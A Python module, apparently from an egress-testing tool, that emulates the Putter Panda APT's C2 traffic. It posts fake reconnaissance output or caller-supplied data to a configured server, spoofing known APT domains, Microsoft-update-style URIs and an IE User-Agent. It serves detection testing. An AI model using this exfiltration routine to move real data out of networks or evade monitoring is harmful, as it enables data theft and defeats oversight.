"""

This module generates putterpanda traffic.

Resources:
http://blog.crowdstrike.com/hat-tribution-pla-unit-61486/
https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/APT/putter.profile

"""

import random
import sys
import urllib.error
import urllib.parse
import urllib.request


class Actor:

    def __init__(self, cli_object):
        self.cli = "putterpanda"
        self.description = "Putter Panda APT"
        self.type = "malware"
        self.server_requirement = "http"
        self.egress_server = cli_object.ip
        self.domains = [
            'ctable.org', 'gamemuster.com', 'kyoceras.net', 'nestlere.com',
            'raylitoday.com', 'renewgis.com', 'siseau.com', 'bmwauto.org',
            't008.net', 'vssigma.com', 'anyoffice.info', 'it-bar.net',
            'jj-desk.com', 'satelliteclub.info', 'space-today.info',
            'sst1.info', 'stream-media.info', 'webfilestore.net']
        self.post_data = [
            {'putterpanda_id': 'uid=0(root) gid=0(root) groups=0(root)'},
            {'putterpanda_whoami': 'root'}, {'putterpanda_dir': 'C:\\, C:\\Windows'},
            {'putterpanda_ps': 'svchost.exe, spoolsvc.exe, explorer.exe, iexplorer.exe'},
            {'putterpanda_ipconfig': '192.168.1.83 255.255.255.0 192.168.1.1'},
            {'putterpanda_ping': 'google.com time=11.6, 19.1, 12.8, 20'}]
        self.encoded_hostnames = [
            'SG9tZVBD', 'Q29tcGFueVdvcmtzdGF0aW9u',
            'd29ya3N0YXRpb24tMTMy', 'UHJpbWFyeURvbWFpbkNvbnRyb2xsZXI=',
            'ZmlsZXNlcnZlcg==', 'd2Vic2VydmVy', 'RE5Tc2VydmVyMg==',
            'Yml0c3kubWl0LmVkdQ==', 'c2VydmVyMS5jaWEuZ292',
            'ZXZpZGVuY2UuZmJpLmdvdg==', 'ZGIuc3NhLmdvdg==',
            'cGlpLmZkYS5nb3Y=', 'ZGF0YS5mZGEuZ292']
        self.uris = [
            '/search5' + str(self.gen_numbers()) + '?h1=' + str(self.gen_numbers(num=2)) + '&h2=' + random.choice('13') + '&h3=' + str(self.gen_numbers(num=6)) + '&h4=' + self.random_letters(),
            '/microsoft/errorpost/default/connect.aspx?ID=' + str(self.gen_numbers()),
            '/MicrosoftUpdate/ShellEX/KB' + str(self.gen_numbers(num=7)) + '/default.aspx?tmp=' + random.choice(self.encoded_hostnames),
            '/microsoft/errorpost/default.aspx?ID=' + str(self.gen_numbers()),
            '/MicrosoftUpdate/GetUpdate/KB' + str(self.gen_numbers(num=7)) + '/default.asp?tmp=' + random.choice(self.encoded_hostnames),
            '/MicrosoftUpdate/GetFiles/KB' + str(self.gen_numbers(num=7)) + '/default.asp?tmp=' + random.choice(self.encoded_hostnames),
            '/MicrosoftUpdate/WWRONG/KB' + str(self.gen_numbers(num=7)) + '/default.asp?tmp=' + random.choice(self.encoded_hostnames)]

    def emulate(self, data_to_exfil=None):

        # headers that are used in get requests
        putter_headers = {
            "Accept": "*/*",
            "Connection": "Keep-Alive",
            "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        }

        # Iterate over get and post request 5 times
        for times_requested in range(1, 6):
            selected_domain = random.choice(self.domains)
            putter_headers['Host'] = selected_domain
            putter_uri = random.choice(self.uris)

            # Determining which data is being sent out by agent
            if data_to_exfil is None:
                posted_data = random.choice(self.post_data)
            else:
                posted_data = {'putterpanda_data': data_to_exfil}

            # UrlEncode and send the data out
            posted_data = urllib.parse.urlencode(posted_data)
            post_req = urllib.request.Request(
                "http://" + self.egress_server + putter_uri, posted_data, headers=putter_headers)

            try:
                urllib.request.urlopen(post_req)
            except urllib.error.URLError:
                print('[*] Error: Cannot connect to putter panda data exfil server!')
                print('[*] Error: Possible firewall, or proxy prventing this?')
                sys.exit(1)

        print('[*] INFO: PutterPanda C2 comms complete!')

        return

    @staticmethod
    def gen_numbers(num=5):
        if num == 5:
            return random.randint(10000, 99999)
        elif num == 2:
            return random.randint(10, 99)
        elif num == 6:
            return random.randint(100000, 999999)
        elif num == 7:
            return random.randint(1000000, 9999999)
        else:
            print('odd error?')
            sys.exit()

    @staticmethod
    def random_letters(total=24):
        random_string = ''.join(
            random.choice('ABCDEFGHIJKLMNOP') for x in range(total))
        return random_string
